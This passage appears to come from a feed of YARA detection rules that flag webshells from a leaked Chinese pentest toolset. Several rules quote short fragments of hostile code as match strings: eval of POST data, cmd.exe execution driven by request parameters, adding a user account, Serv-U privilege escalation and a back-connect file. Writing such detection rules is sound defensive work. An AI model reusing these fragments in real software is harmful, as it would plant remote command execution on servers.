ascii\n   condition: \n      filesize < 91KB and all of them\n}","date":"2015-06-23 13:48:41","description":"Webshell from CN Honker Pentest Toolset - file sniff.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASPX_sniff_RID320D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"04db1cf71c388468cb010057cbddf1e1","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_udf_udf_RID3139 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file udf.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:13:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<?php // Source  My : Meiam  \" fullword ascii\n      $s2 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n   condition: \n      filesize < 430KB and all of them\n}","date":"2015-06-23 13:13:21","description":"Webshell from CN Honker Pentest Toolset - file udf.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_udf_udf_RID3139","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"c72e6fefc40369bcb4fe3e4fb6edecc2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_JSP_jsp_RID30F5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jsp.html\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:02:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input name=f size=30 value=shell.jsp>\" fullword ascii\n      $s2 = \"<font color=red>www.i0day.com  By:\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2015-06-23 13:02:01","description":"Webshell from CN Honker Pentest Toolset - file jsp.html","minimum_yara":"1.7","name":"CN_Honker_Webshell_JSP_jsp_RID30F5","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f82abad2e367b5fda729170e30e6774e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail_RID36D6 : DEMO T1015 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mail.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:12:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1015, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (!$this->smtp_putcmd(\\\"AUTH LOGIN\\\", base64_encode($this->user)))\" fullword ascii\n      $s2 = \"$this->smtp_debug(\\\"> \\\".$cmd.\\\"\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 39KB and all of them\n}","date":"2015-06-23 17:12:51","description":"Webshell from CN Honker Pentest Toolset - file mail.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail_RID36D6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3a823be7813d09f5fc4b62b88ff8bcb3","score":70,"tags":["T1100","DEMO","WEBSHELL","T1015"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_phpwebbackup_RID3358 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file phpwebbackup.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php // Code By isosky www.nbst.org\" fullword ascii\n      $s2 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 67KB and all of them\n}","date":"2015-06-23 14:43:51","description":"Webshell from CN Honker Pentest Toolset - file phpwebbackup.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_phpwebbackup_RID3358","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"14c997486b4724106ae0d812a9ccf6bf","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_dz_phpcms_phpbb_RID348F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:35:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if($pwd == md5(md5($password).$salt))\" fullword ascii\n      $s2 = \"function test_1($password)\" fullword ascii\n      $s3 = \":\\\".$pwd.\\\"\\\\n---------------------------------\\\\n\\\";exit;\" fullword ascii\n      $s4 = \":user=\\\".$user.\\\"\\\\n\\\";echo \\\"pwd=\\\".$pwd.\\\"\\\\n\\\";echo \\\"salt=\\\".$salt.\\\"\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 22KB and all of them\n}","date":"2015-06-23 15:35:41","description":"Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_dz_phpcms_phpbb_RID348F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"37393d52ccedd6e3e3c0998023148197","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_picloaked_1_RID3298 : DEMO T1036 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file 1.gif\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:11:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1036, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval($_POST[\" ascii\n      $s1 = \";<%execute(request(\" ascii\n      $s3 = \"GIF89a\" fullword ascii\n   condition: \n      filesize < 6KB and 2 of them\n}","date":"2015-06-23 14:11:51","description":"Webshell from CN Honker Pentest Toolset - file 1.gif","minimum_yara":"1.7","name":"CN_Honker_Webshell_picloaked_1_RID3298","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cbe4826769a0f4f7e4f34189d9bf1d65","score":70,"tags":["T1100","DEMO","WEBSHELL","T1036"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_assembly_RID31BC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file assembly.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:35:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write oScriptlhn.exec(\\\"cmd.exe /c\\\" & request(\\\"c\\\")).stdout.readall\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 13:35:11","description":"Webshell from CN Honker Pentest Toolset - file assembly.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_assembly_RID31BC","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"2893c5e2507731134aff00f3dd4bc713","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php8_RID3123 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php8.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<a href=\\\"http://hi.baidu.com/ca3tie1/home\\\" target=\\\"_blank\\\">Ca3tie1's Blog</a\" ascii\n      $s1 = \"function startfile($path = 'dodo.zip')\" fullword ascii\n      $s3 = \"<form name=\\\"myform\\\" method=\\\"post\\\" action=\\\"\\\">\" fullword ascii\n      $s5 = \"$_REQUEST[zipname] = \\\"dodozip.zip\\\"; \" fullword ascii\n   condition: \n      filesize < 25KB and 2 of them\n}","date":"2015-06-23 13:09:41","description":"Webshell from CN Honker Pentest Toolset - file php8.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php8_RID3123","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"959caab162bee77587db7eef6177d8ea","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Tuoku_script_xx_RID34B7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file xx.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:42:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$mysql.=\\\"insert into `$table`($keys) values($vals);\\\\r\\\\n\\\";\" fullword ascii\n      $s2 = \"$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password\" ascii\n      $s16 = \"mysql_query(\\\"SET NAMES gbk\\\");\" fullword ascii\n   condition: \n      filesize < 2KB and all of them\n}","date":"2015-06-23 15:42:21","description":"Webshell from CN Honker Pentest Toolset - file xx.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_Tuoku_script_xx_RID34B7","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"4051f21e2485c1a641974d19cbe2681b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_JSPMSSQL_RID30D9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file JSPMSSQL.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<form action=\\\"?action=operator&cmd=execute\\\"\" fullword ascii\n      $s2 = \"String sql = request.getParameter(\\\"sqlcmd\\\");\" fullword ascii\n   condition: \n      filesize < 35KB and all of them\n}","date":"2015-06-23 12:57:21","description":"Webshell from CN Honker Pentest Toolset - file JSPMSSQL.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_JSPMSSQL_RID30D9","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"2258ce83c8b65b102c8dc96ed0d17c14","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Injection_Transit_jmPost_RID381F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jmPost.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 18:07:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"response.write  PostData(JMUrl,JmStr,JmCok,JmRef)\" fullword ascii\n      $s2 = \"JmdcwName=request(\\\"jmdcw\\\")\" fullword ascii\n   condition: \n      filesize < 9KB and all of them\n}","date":"2015-06-23 18:07:41","description":"Webshell from CN Honker Pentest Toolset - file jmPost.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_Injection_Transit_jmPost_RID381F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"2d01631f3d672c338fef8209002676dd","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_web_asp_RID3280 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file web.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:07:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<FORM method=post target=_blank>ShellUrl: <INPUT \" fullword ascii\n      $s1 = \"\\\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>\" fullword ascii\n   condition: \n      filesize < 13KB and all of them\n}","date":"2015-06-23 14:07:51","description":"Webshell from CN Honker Pentest Toolset - file web.asp.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_web_asp_RID3280","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"898b2f97937ef7b0113064d23bd70299","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_wshell_asp_RID328E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file wshell-asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:10:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"file1.Write(\\\"<%response.clear:execute request(\\\\\\\"root\\\\\\\"):response.End%>\\\");\" fullword ascii\n      $s2 = \"hello word !  \" fullword ascii\n      $s3 = \"root.asp \" fullword ascii\n   condition: \n      filesize < 5KB and all of them\n}","date":"2015-06-23 14:10:11","description":"Webshell from CN Honker Pentest Toolset - file wshell-asp.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_wshell_asp_RID328E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9be67af6b50e623b06068697bbf64b6f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_asp404_RID317B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp404.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:24:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"temp1 = Len(folderspec) - Len(server.MapPath(\\\"./\\\")) -1\" fullword ascii\n      $s1 = \"<form name=\\\"form1\\\" method=\\\"post\\\" action=\\\"<%= url%>?action=chklogin\\\">\" fullword ascii\n      $s2 = \"<td>&nbsp;<a href=\\\"<%=tempurl+f1.name%>\\\" target=\\\"_blank\\\"><%=f1.name%></a></t\" ascii\n   condition: \n      filesize < 113KB and all of them\n}","date":"2015-06-23 13:24:21","description":"Webshell from CN Honker Pentest Toolset - file asp404.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_asp404_RID317B","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8a292acef66c78b80b106967c9c4fe1c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Serv_U_asp_RID3253 : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:00:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"newuser = \\\"-SETUSERSETUP\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\"-PortNo=\\\" &\" ascii\n      $s2 = \"<td><input name=\\\"c\\\" type=\\\"text\\\" id=\\\"c\\\" value=\\\"cmd /c net user goldsun lov\" ascii\n      $s3 = \"deldomain = \\\"-DELETEDOMAIN\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\" PortNo=\\\"\" ascii\n   condition: \n      filesize < 30KB and 2 of them\n}","date":"2015-06-23 14:00:21","description":"Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_Serv_U_asp_RID3253","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f44bff7ab4dfcb6dcf1146159e37b11c","score":70,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_cfm_list_RID31AD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file list.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:32:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<TD><a href=\\\"javascript:ShowFile('#mydirectory.name#')\\\">#mydirectory.name#</a>\" ascii\n      $s2 = \"<TD>#mydirectory.size#</TD>\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-06-23 13:32:41","description":"Webshell from CN Honker Pentest Toolset - file list.cfm","minimum_yara":"1.7","name":"CN_Honker_Webshell_cfm_list_RID31AD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b4514250f1e4f98b5b4d761d5e5c4431","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Tuoku_script_oracle_RID363D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file oracle.jsp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:47:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"String url=\\\"jdbc:oracle:thin:@localhost:1521:orcl\\\";\" fullword ascii\n      $s2 = \"String user=\\\"oracle_admin\\\";\" fullword ascii\n      $s3 = \"String sql=\\\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\\\";\" fullword ascii\n   condition: \n      filesize < 7KB and all of them\n}","date":"2015-06-23 16:47:21","description":"Webshell from CN Honker Pentest Toolset - file oracle.jsp","minimum_yara":"1.7","name":"CN_Honker_Webshell_Tuoku_script_oracle_RID363D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"69c97ebb72f7c9a6f26e2cc32a9846c3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASPX_aspx4_RID31E7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx4.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:42:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"File.Delete(cdir.FullName + \\\"\\\\\\\\test\\\");\" fullword ascii\n      $s5 = \"start<asp:TextBox ID=\\\"Fport_TextBox\\\" runat=\\\"server\\\" Text=\\\"c:\\\\\\\" Width=\\\"60\" ascii\n      $s6 = \"<div>Code By <a href =\\\"http://www.hkmjj.com\\\">Www.hkmjj.Com</a></div>\" fullword ascii\n   condition: \n      filesize < 11KB and all of them\n}","date":"2015-06-23 13:42:21","description":"Webshell from CN Honker Pentest Toolset - file aspx4.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASPX_aspx4_RID31E7","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"640e3bb33af58f44f379ac6bb5335a2b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASPX_aspx_RID31B3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:33:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"string iVDT=\\\"-SETUSERSETUP\\\\r\\\\n-IP=0.0.0.0\\\\r\\\\n-PortNo=52521\\\\r\\\\n-User=bin\" ascii\n      $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n      $s2 = \"td.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('urJG','\\\"+dt.Rows[j][\\\"ProcessID\" ascii\n      $s3 = \"vyX.Text+=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('Bin_Regread','\\\"+MVVJ(rootkey)+\" ascii\n   condition: \n      filesize < 353KB and 2 of them\n}","date":"2015-06-23 13:33:41","description":"Webshell from CN Honker Pentest Toolset - file aspx.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASPX_aspx_RID31B3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"91a5fde1c904dee16213bafca75a4139","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_su7_x_9_x_RID31C1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"returns=httpopen(\\\"LoginID=\\\"&user&\\\"&FullName=&Password=\\\"&pass&\\\"&ComboPasswor\" ascii\n      $s1 = \"returns=httpopen(\\\"\\\",\\\"POST\\\",\\\"http://127.0.0.1:\\\"&port&\\\"/Admin/XML/User.xml?\" ascii\n   condition: \n      filesize < 59KB and all of them\n}","date":"2015-06-23 13:36:01","description":"Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_su7_x_9_x_RID31C1","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e4ce90a5c8ade05dbe99f70e72ffb1ac","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_cfmShell_RID318A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file cfmShell.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:26:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<cfexecute name=\\\"C:\\\\Winnt\\\\System32\\\\cmd.exe\\\"\" fullword ascii\n      $s4 = \"<cfif FileExists(\\\"#GetTempDirectory()#foobar.txt\\\") is \\\"Yes\\\">\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}","date":"2015-06-23 13:26:51","description":"Webshell from CN Honker Pentest Toolset - file cfmShell.cfm","minimum_yara":"1.7","name":"CN_Honker_Webshell_cfmShell_RID318A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"38b2a94e1aa4c262146136fd3d5f2d2f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_asp4_RID3117 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp4.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"cmd.exe\\\"\" fullword ascii\n      $s6 = \"Response.Cookies(Cookie_Login) = sPwd\" fullword ascii\n      $s8 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n   condition: \n      filesize < 150KB and all of them\n}","date":"2015-06-23 13:07:41","description":"Webshell from CN Honker Pentest Toolset - file asp4.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_asp4_RID3117","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"418616d5a4715987c68072356c270e43","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Serv_U_2_admin_by_lake2_RID3711 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:22:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"xPost3.Open \\\"POST\\\", \\\"http://127.0.0.1:\\\"& port &\\\"/lake2\\\", True\" fullword ascii\n      $s2 = \"response.write \\\"FTP user lake  pass admin123 :)<br><BR>\\\"\" fullword ascii\n      $s8 = \"<p>Serv-U Local Get SYSTEM Shell with ASP\" fullword ascii\n      $s9 = \"\\\"-HomeDir=c:\\\\\\\\\\\" & vbcrlf & \\\"-LoginMesFile=\\\" & vbcrlf & \\\"-Disable=0\\\" & vb\" ascii\n   condition: \n      filesize < 17KB and 2 of them\n}","date":"2015-06-23 17:22:41","description":"Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_Serv_U_2_admin_by_lake2_RID3711","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a926cd12ac308ecbe12773b04d759aad","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php3_RID311E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php3.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:08:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"} elseif(@is_resource($f = @popen($cfe,\\\"r\\\"))) {\" fullword ascii\n      $s2 = \"cf('/tmp/.bc',$back_connect);\" fullword ascii\n   condition: \n      